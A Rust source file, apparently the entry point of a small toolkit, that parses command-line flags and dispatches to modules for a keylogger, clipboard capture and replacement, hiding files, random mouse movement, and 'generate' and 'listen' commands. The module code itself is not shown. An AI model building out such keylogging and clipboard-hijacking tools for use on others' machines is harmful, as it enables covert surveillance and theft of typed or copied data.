mod generator;
mod listener;
mod tools;
use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, Tool};
use std::{
    error::Error,
};

fn check_tool(input: &str) -> Tool {
    match input {
        "keylogger" => return Tool::Keylogger,
        "clipboard" => return Tool::Clipboard,
        "replaceboard" => return Tool::ReplaceBoard,
        "ghost" => return Tool::Ghost,
        "mouseketool" => return Tool::Mouseketool,
        _ => return Tool::Invalid, 
    }
}

pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static str> {
    args.next(); // Skip the first argument (usually the program name)
    
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "generate" => {
                generator::generate();
            }
            "listen" => {
                listener::start();
            }
            "-t" | "--tool" => {
                if let Some(value) = args.next() {
                    return Ok(check_tool(&value));
                } else {
                    return Err("Did not supply a tool name");
                }
            }
            "--list" => {
                return Err("\n
Available tools:
- clipboard         Outputs the current clipboard
- ghost             Changes files in the current directory to hidden
- keylogger         Listens for keypresses and outputs them to a log file
- mouseketool       Moves mouse to a random position every so often
- replaceboard      Replaces the clipboard text
");

            }
            _ => return Err("Invalid flag"),
        }
    }
    
    Err("
No tool specified. Use -t or --tool to specify a tool
Use --list to see a list of available tools")
}

pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
    match tool {
        Tool::Keylogger => {
            let _ = keylogger::run();
        }
        Tool::Clipboard => {
            let _ = clipboard::run()?;
        }
        Tool::ReplaceBoard => {
            let _ = replaceboard::run()?;
        }
        Tool::Ghost => {
            let _ = ghost::run()?;
        }
        Tool::Mouseketool => {
            let _ = mouseketool::run()?;
        } 
        Tool::Invalid => {
            // Return an error if the tool is invalid
            return Err("Invalid tool".into());
        }
    }
    Ok(())
}
